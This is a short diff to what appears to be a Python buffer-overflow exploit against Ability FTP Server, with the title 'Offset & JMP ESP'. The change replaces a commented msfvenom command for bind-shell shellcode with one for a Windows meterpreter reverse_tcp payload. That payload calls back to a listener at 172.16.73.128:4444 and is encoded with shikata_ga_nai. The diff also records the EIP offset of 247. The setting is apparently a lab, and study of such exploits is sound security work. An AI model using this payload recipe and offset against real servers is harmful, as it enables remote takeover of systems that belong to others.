@@ -11,7 +11,7 @@ Ability FTP Server Exploit - Offset & JMP ESP
 """
 
 print banner
-#msfvenom -a x86 --platform Windows -p windows/shell_bind_tcp LHOST=172.16.73.129 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -f c
+#msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=172.16.73.128 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -f c
 #shellcode = ()
 
 #EIP = 69413269 -> offset at 247
